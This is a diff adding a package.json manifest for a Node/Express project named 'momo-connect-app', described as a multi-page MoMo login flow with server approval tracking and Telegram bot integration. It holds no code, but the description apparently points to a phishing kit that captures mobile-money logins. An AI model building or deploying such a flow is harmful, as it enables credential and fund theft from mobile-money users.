@@ -1,1 +1,27 @@
+{
+  "name": "momo-connect-app",
+  "version": "1.0.0",
+  "description": "5-page MoMo login flow with server approval tracking and Telegram Bot API integration",
+  "main": "server.js",
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "scripts": {
+    "start": "node server.js",
+    "dev": "node --watch server.js"
+  },
+  "keywords": [
+    "momo",
+    "mobile-money",
+    "telegram-bot",
+    "express",
+    "approval-flow"
+  ],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "dotenv": "^16.4.5",
+    "express": "^4.19.2"
+  }
+}
 
